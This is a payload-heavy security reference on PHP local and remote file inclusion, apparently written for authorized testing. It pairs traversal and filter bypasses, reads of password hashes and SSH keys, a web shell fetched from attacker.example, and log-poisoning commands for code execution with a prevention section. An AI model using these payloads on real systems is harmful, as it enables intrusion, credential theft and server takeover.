# File Inclusion (LFI & RFI)

> **⚠️ AUTHORIZED USE ONLY.** For education and authorized testing only. Use these payloads solely on systems you own or that are explicitly in scope for an authorized engagement. Log poisoning and RCE techniques modify server state, so confirm they are permitted by the rules of engagement before use. See the Legal and Terms of Use page.

**Scope:** Practical exploitation and prevention of Local and Remote File Inclusion. Payload-first reference.

## Table of Contents
- [Quick Reference](#quick-reference)
- [Vulnerable Code](#vulnerable-code)
- [Path Traversal](#path-traversal)
- [LFI Target Files](#lfi-target-files)
- [Filter Bypasses](#filter-bypasses)
- [PHP Wrappers](#php-wrappers)
- [Remote File Inclusion](#remote-file-inclusion)
- [LFI to RCE](#lfi-to-rce)
- [Detection Workflow](#detection-workflow)
- [Automation](#automation)
- [Impact](#impact)
- [Prevention](#prevention)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. Quick Reference

| Term | Meaning |
|------|---------|
| **LFI** | Local File Inclusion: the app includes a file already on the server |
| **RFI** | Remote File Inclusion: the app includes a file from a remote URL |
| **Path traversal** | Using `../` to escape the intended directory |
| **Wrapper** | A PHP stream protocol (`php://`, `data://`) usable as an inclusion target |
| **Log poisoning** | Writing code into a log file, then including it |
| **CWE-98 / CWE-22** | File inclusion / path traversal classifications |

| | LFI | RFI |
|---|-----|-----|
| **Source** | Local filesystem | Attacker's server |
| **Requires** | Nothing special | `allow_url_include=On` |
| **Prevalence** | Common | Rare (disabled by default since PHP 5.2) |
| **Path to RCE** | Indirect (poisoning, wrappers, upload) | Direct |

## 2. Vulnerable Code

```php
// Direct: fully controlled
include($_GET['page']);

// Appended extension: blocks arbitrary extensions
include($_GET['page'] . '.php');

// Prefixed directory: must traverse out
include('/var/www/pages/' . $_GET['page']);
```

**Vulnerable functions:** `include`, `include_once`, `require`, `require_once`, `file_get_contents`, `fopen`, `readfile`, `highlight_file`, `show_source`.

**Parameters worth testing:**

```text
page, file, path, doc, document, folder, root, pg, style, template
view, content, lang, language, module, inc, include, load, read, dir
```

## 3. Path Traversal

`../` moves up one directory. Repeat it to climb from the app's directory to the filesystem root, then descend to the target.

```text
../../../etc/passwd
../../../../etc/passwd
../../../../../../../../etc/passwd
```

You rarely know the depth, so **overshoot**. Extra `../` at root is harmless, since `/../` is still `/`.

```bash
# absolute path, when no prefix is applied
/etc/passwd

# Windows separator
..\..\..\windows\win.ini
```

## 4. LFI Target Files

### Linux

| File | Value |
|------|-------|
| `/etc/passwd` | User list. The standard proof-of-concept |
| `/etc/shadow` | Password hashes (needs root) |
| `/etc/hosts` | Internal hostnames |
| `/etc/issue`, `/etc/os-release` | OS fingerprint |
| `/proc/self/environ` | Env vars, sometimes secrets. RCE vector |
| `/proc/self/cmdline` | Running process command line |
| `/proc/self/fd/0-20` | Open file descriptors, may expose logs |
| `/proc/net/tcp` | Active connections |
| `/var/log/apache2/access.log` | RCE via log poisoning |
| `/var/log/auth.log` | RCE via SSH log poisoning |
| `~/.ssh/id_rsa` | Private key |
| `~/.bash_history` | Command history |
| `/var/www/html/config.php` | App DB credentials |
| `/var/lib/php/sessions/sess_<id>` | Session files. RCE vector |

### Windows

| File | Value |
|------|-------|
| `C:\Windows\win.ini` | Standard proof-of-concept |
| `C:\Windows\System32\drivers\etc\hosts` | Hostnames |
| `C:\Windows\repair\SAM` | Password hashes |
| `C:\inetpub\logs\LogFiles\` | IIS logs |
| `C:\Windows\debug\NetSetup.log` | Domain info |

## 5. Filter Bypasses

### Appended extension (`.php` added by the app)

```text
# Null byte (PHP < 5.3.4 only)
../../../etc/passwd%00

# Path truncation (older PHP): pad past 4096 chars
../../../etc/passwd/./././././././  [repeat ~2048x]

# Wrappers ignore the extension entirely (see Section 6)
php://filter/convert.base64-encode/resource=config
```

### Traversal string stripped

```text
# Nested: stripping the inner "../" reassembles a valid one
....//....//....//etc/passwd
..././..././etc/passwd
....\/....\/etc/passwd
```

### Encoding

```text
%2e%2e%2f              →  ../
%2e%2e/                →  ../
..%2f                  →  ../
%252e%252e%252f        →  double-encoded ../
..%c0%af               →  UTF-8 overlong
..%ef%bc%8f            →  fullwidth solidus
```

### Prefixed directory (`/var/www/pages/` prepended)

```text
# just traverse out of it
../../../etc/passwd
```

### Extension allow-list (must end in `.php`)

```text
# Sometimes a trailing null or query truncation works on RFI
http://attacker.example/shell.txt?
http://attacker.example/shell.txt%23
```

## 6. PHP Wrappers

The most reliable LFI escalation. Wrappers bypass appended extensions and enable source disclosure and code execution.

### php://filter (source code disclosure)

Reads a file as base64, so PHP source is returned instead of executed.

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
```

```bash
curl -s "http://target/?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

This is the highest-value first move: read the app's own source to find credentials and further flaws.

### data:// (needs `allow_url_include=On`)

```text
data://text/plain,<?php phpinfo(); ?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

### php://input (needs `allow_url_include=On`)

Sends code in the POST body.

```bash
curl -s "http://target/?page=php://input" --data '<?php system("id"); ?>'
```

### expect:// (needs the expect extension, rare)

```text
expect://id
```

### zip:// and phar://

```text
zip://uploaded.zip%23shell.php
phar://uploaded.phar/test.txt
```

Useful when file upload exists but the uploaded file cannot be included directly.

### Wrapper availability

| Wrapper | Requires |
|---------|----------|
| `php://filter` | Nothing. Almost always works |
| `php://input` | `allow_url_include=On` |
| `data://` | `allow_url_include=On` |
| `expect://` | expect extension installed |
| `zip://`, `phar://` | File upload capability |

## 7. Remote File Inclusion

Requires `allow_url_include=On`, off by default since PHP 5.2, so RFI is uncommon on modern targets.

```text
http://target/?page=http://attacker.example/shell.txt
http://target/?page=//attacker.example/shell.txt
http://target/?page=\\attacker.example\share\shell.txt
```

Host a payload with a non-executing extension so your own server does not run it:

```php
// shell.txt on the attacker's server
<?php system($_GET['cmd']); ?>
```

Defeat an appended extension by truncating with `?` or `#`:

```text
http://attacker.example/shell.txt?
http://attacker.example/shell.txt%23
```

Test the primitive first with a plain callback:

```bash
python3 -m http.server 8000    # watch for the hit
```

## 8. LFI to RCE

LFI alone reads files. These techniques turn reading into execution.

### Log poisoning (Apache)

Inject PHP into a log the server writes, then include the log.

```bash
# 1. poison the access log via User-Agent
curl -s "http://target/" -A '<?php system($_GET["c"]); ?>'

# 2. include the log and run a command
curl -s "http://target/?page=../../../var/log/apache2/access.log&c=id"
```

### Log poisoning (SSH auth.log)

```bash
# username becomes the log entry
ssh '<?php system($_GET["c"]); ?>'@target

# then include
curl -s "http://target/?page=../../../var/log/auth.log&c=id"
```

### /proc/self/environ

Works where the User-Agent lands in the environment.

```bash
curl -s "http://target/?page=../../../proc/self/environ" -A '<?php system($_GET["c"]); ?>'
```

### PHP session files

```text
1. Find your session ID in the PHPSESSID cookie
2. Get attacker-controlled input stored in the session (username, search term)
3. Include: ../../../var/lib/php/sessions/sess_<PHPSESSID>
```

Common session paths: `/var/lib/php/sessions/`, `/tmp/`, `/var/lib/php5/`.

### Upload plus include

If any upload exists (avatar, document), upload a file containing PHP and include it by path. The extension does not matter, because `include` executes content, not extension.

### php://filter chains

Chained iconv filters can generate arbitrary content from a filter string alone, achieving RCE with **no file write required**. Tooling exists to build the chain; the takeaway is that `php://filter` availability alone can be sufficient for RCE on modern PHP.

### Which to try first

| Order | Technique | Why |
|-------|-----------|-----|
| 1 | `php://filter` source read | Passive, reveals credentials and config |
| 2 | Upload plus include | Cleanest if upload exists |
| 3 | Session file poisoning | Reliable, no log write permissions needed |
| 4 | Log poisoning | Noisy, writes to logs, may need path guessing |
| 5 | `php://input` / `data://` | Only if `allow_url_include` is on |

## 9. Detection Workflow

| Step | Action |
|------|--------|
| **1** | Find parameters that look like filenames or paths |
| **2** | Submit a known-good value, record the baseline response |
| **3** | Try `/etc/passwd` absolute, then `../../../etc/passwd` |
| **4** | Increase traversal depth until output changes |
| **5** | Try `php://filter` on a known app file |
| **6** | Test RFI with a URL to your own listener |
| **7** | If reads work, escalate per Section 8 |

### Reading the response

| Observation | Meaning |
|-------------|---------|
| File contents returned | Confirmed LFI |
| `failed to open stream: No such file` | Included path is attacker-controlled; adjust depth |
| Blank page, no error | Possible inclusion with no output. Try `php://filter` |
| Error names the full path | Leaks the web root, use it to build absolute paths |
| Error shows appended extension | Tells you exactly what suffix to bypass |

**Error messages are the fastest recon.** `include(/var/www/pages/foo.php)` reveals both the prefix and the suffix in one line.

## 10. Automation

### ffuf

```bash
# fuzz traversal payloads
ffuf -u "http://target/?page=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -fs 1234

# fuzz parameter names
ffuf -u "http://target/?FUZZ=/etc/passwd" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs 1234
```

`-fs` filters by the baseline response size, which is usually the key to separating hits from noise.

### curl depth loop

```bash
for i in $(seq 1 10); do
  p=$(printf '../%.0s' $(seq 1 $i))
  echo "depth $i:"
  curl -s "http://target/?page=${p}etc/passwd" | head -3
done
```

### Wordlists

```text
/usr/share/seclists/Fuzzing/LFI/
/usr/share/wordlists/dirb/
```

## 11. Impact

| Impact | Detail |
|--------|--------|
| **Source code disclosure** | App logic, credentials, API keys, further vulnerabilities |
| **Credential theft** | Config files, `.env`, SSH keys, DB passwords |
| **Sensitive data access** | `/etc/passwd`, session files, user data |
| **Remote code execution** | Via poisoning, upload, or wrappers |
| **Full server compromise** | RCE plus privilege escalation |
| **Pivoting** | Server becomes a foothold into the internal network |

LFI is frequently rated medium in isolation, but **any LFI on a PHP target should be assumed escalatable to RCE** until proven otherwise. Rate it accordingly.

## 12. Prevention

### The fix: never pass user input to an inclusion function

```php
// VULNERABLE
include($_GET['page'] . '.php');

// SECURE: allow-list mapping, user input never touches the path
$pages = [
    'home'    => 'pages/home.php',
    'about'   => 'pages/about.php',
    'contact' => 'pages/contact.php',
];
$key = $_GET['page'] ?? 'home';
if (!array_key_exists($key, $pages)) {
    http_response_code(404);
    exit;
}
include($pages[$key]);
```

The user supplies a **key**, not a path. No traversal, encoding, or wrapper trick applies, because the input never reaches the filesystem.

### If a path must be built

```php
$base = '/var/www/pages/';
$file = realpath($base . basename($_GET['page']));

// resolve, then confirm it is still inside the intended directory
if ($file === false || strpos($file, $base) !== 0) {
    exit('Invalid');
}
include($file);
```

`basename()` strips directory components; `realpath()` resolves `../` and symlinks so the prefix check is meaningful. Validate **after** resolution, never before.

### Configuration hardening

```ini
allow_url_include = Off      ; kills RFI and php://input, data://
allow_url_fopen = Off        ; blocks remote stream access
open_basedir = /var/www/html ; confines file access to one directory
```

### Checklist

| Control | Role |
|---------|------|
| **Allow-list mapping** | The primary fix |
| **`allow_url_include=Off`** | Eliminates RFI entirely |
| **`open_basedir`** | Contains traversal even if it succeeds |
| **`basename()` + `realpath()` + prefix check** | When dynamic paths are unavoidable |
| **Never filter with a denylist** | `../` has too many encodings |
| **Least-privilege web user** | Limits what a successful read reaches |
| **Uploads outside the web root, non-executable** | Removes the upload-plus-include path |
| **Disable verbose errors** | Denies path disclosure |

## 13. Fast Recall

- **LFI** includes a local file; **RFI** includes a remote one and needs `allow_url_include=On` (off by default since PHP 5.2).
- **`../`** climbs one directory. Overshoot the depth; extra `../` at root is harmless.
- **`/etc/passwd`** (Linux) and **`C:\Windows\win.ini`** (Windows) are the standard proofs.
- **`php://filter/convert.base64-encode/resource=file`** reads source without executing it. First move on any PHP LFI.
- **Bypasses:** null byte `%00` (old PHP), nested `....//`, URL and double encoding `%2e%2e%2f` / `%252e%252e%252f`.
- **Wrappers ignore appended extensions**, which is why they beat `.php` suffix filters.
- **LFI to RCE paths:** log poisoning (`access.log` via User-Agent, `auth.log` via SSH username), `/proc/self/environ`, PHP session files, upload plus include, `php://filter` chains.
- **Try in order:** `php://filter` read, upload plus include, session poisoning, log poisoning.
- **Error messages leak the prefix and suffix**, which tells you exactly what to bypass.
- **Fix:** allow-list mapping so user input is a key, never a path.
- **If paths must be dynamic:** `basename()` + `realpath()` + verify the resolved path starts with the intended base.
- **Harden config:** `allow_url_include=Off`, `allow_url_fopen=Off`, `open_basedir`.
- **Assume any PHP LFI is escalatable to RCE** when rating severity.

## 14. Resources

**Standards**
- [OWASP: Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [MITRE CWE-98: PHP Remote File Inclusion](https://cwe.mitre.org/data/definitions/98.html)
- [MITRE CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP: Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

**Reference**
- [PHP Manual: include](https://www.php.net/manual/en/function.include.php)
- [PHP Manual: Supported protocols and wrappers](https://www.php.net/manual/en/wrappers.php)
- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

**Practice (authorized labs)**
- [PortSwigger: File path traversal](https://portswigger.net/web-security/file-path-traversal)
- [DVWA](https://github.com/digininja/DVWA)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

**Tools**
- [ffuf](https://github.com/ffuf/ffuf)
- [SecLists (LFI wordlists)](https://github.com/danielmiessler/SecLists)
- [Burp Suite](https://portswigger.net/burp)
